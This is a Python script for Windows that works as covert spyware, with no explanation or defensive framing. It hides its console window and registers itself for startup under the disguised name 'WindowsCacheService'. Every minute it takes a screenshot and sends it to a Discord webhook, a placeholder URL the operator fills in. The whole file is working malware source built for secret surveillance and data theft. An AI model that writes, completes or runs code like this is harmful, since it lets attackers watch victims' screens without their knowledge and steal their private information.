import os
import sys
import io
import time
import ctypes
import base64
import struct
import urllib.request
import urllib.error
import subprocess
import winreg
try:
    console_hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    if console_hwnd:
        ctypes.windll.user32.ShowWindow(console_hwnd, 0)
except Exception:
    pass
WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE"
INTERVAL = 60
MUTEX_NAME = "Global\\WindowsCacheServiceMutex"
STARTUP_REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"
STARTUP_REG_NAME = "WindowsCacheService"
try:
    mutex = ctypes.windll.kernel32.CreateMutexW(None, False, MUTEX_NAME)
    if ctypes.windll.kernel32.GetLastError() == 183:
        sys.exit(0)
except Exception:
    pass
def ensure_persistence():
    try:
        script_path = os.path.abspath(sys.argv[0])
        if not script_path.lower().endswith(('.pyw', '.py')):
            script_path = os.path.abspath(sys.argv[0])
        python_dir = os.path.dirname(sys.executable)
        pythonw = os.path.join(python_dir, "pythonw.exe")
        if not os.path.exists(pythonw):
            pythonw = sys.executable
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, STARTUP_REG_PATH,
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, STARTUP_REG_NAME, 0, winreg.REG_SZ,
                          f'"{pythonw}" "{script_path}"')
        winreg.CloseKey(key)
        return True
    except Exception:
        return False
def take_screenshot():
    try:
        from PIL import ImageGrab
        screenshot = ImageGrab.grab()
        buf = io.BytesIO()
        screenshot.save(buf, format="PNG")
        buf.seek(0)
        return buf
    except ImportError:
        pass
    try:
        user32 = ctypes.windll.user32
        gdi32 = ctypes.windll.gdi32
        width = user32.GetSystemMetrics(0)
        height = user32.GetSystemMetrics(1)
        hdc_screen = user32.GetDC(None)
        hdc_mem = gdi32.CreateCompatibleDC(hdc_screen)
        hbmp = gdi32.CreateCompatibleBitmap(hdc_screen, width, height)
        gdi32.SelectObject(hdc_mem, hbmp)
        gdi32.BitBlt(hdc_mem, 0, 0, width, height, hdc_screen, 0, 0, 0x00CC0020)
        bmp_header_size = 54
        dib_header_size = 40
        stride = ((width * 3 + 3) // 4) * 4
        image_size = stride * height
        bmp_data = b""
        bmp_data += b"BM"
        bmp_data += struct.pack("<I", bmp_header_size + dib_header_size + image_size)
        bmp_data += struct.pack("<HH", 0, 0)
        bmp_data += struct.pack("<I", bmp_header_size + dib_header_size)
        bmp_data += struct.pack("<I", dib_header_size)
        bmp_data += struct.pack("<i", width)
        bmp_data += struct.pack("<i", height)
        bmp_data += struct.pack("<HH", 1, 24)
        bmp_data += struct.pack("<I", 0)
        bmp_data += struct.pack("<I", image_size)
        bmp_data += struct.pack("<ii", 0, 0)
        bmp_data += struct.pack("<II", 0, 0)
        buf_size = image_size
        buf = ctypes.create_string_buffer(buf_size)
        gdi32.GetDIBits(hdc_mem, hbmp, 0, height, buf,
                        ctypes.byref(ctypes.create_string_buffer(dib_header_size + 40)),
                        0)
        bmp_data += buf.raw
        gdi32.DeleteObject(hbmp)
        gdi32.DeleteDC(hdc_mem)
        user32.ReleaseDC(None, hdc_screen)
        return io.BytesIO(bmp_data)
    except Exception:
        return None
def send_screenshot_to_discord(image_buffer):
    try:
        boundary = "----WebhookBoundary" + base64.b64encode(os.urandom(12)).decode()
        body_parts = []
        body_parts.append(f"--{boundary}".encode())
        body_parts.append(b'Content-Disposition: form-data; name="file"; filename="screen.png"')
        body_parts.append(b"Content-Type: image/png")
        body_parts.append(b"")
        body_parts.append(image_buffer.getvalue())
        body_parts.append(f"--{boundary}--".encode())
        body = b"\r\n".join(body_parts)
        headers = {
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        }
        req = urllib.request.Request(WEBHOOK_URL, data=body, headers=headers, method="POST")
        with urllib.request.urlopen(req, timeout=20) as resp:
            return resp.status == 200
    except Exception:
        return False
def main_loop():
    ensure_persistence()
    while True:
        try:
            img_buffer = take_screenshot()
            if img_buffer:
                send_screenshot_to_discord(img_buffer)
        except Exception:
            pass
        time.sleep(INTERVAL)
if __name__ == "__main__":
    try:
        main_loop()
    except Exception:
        sys.exit(1)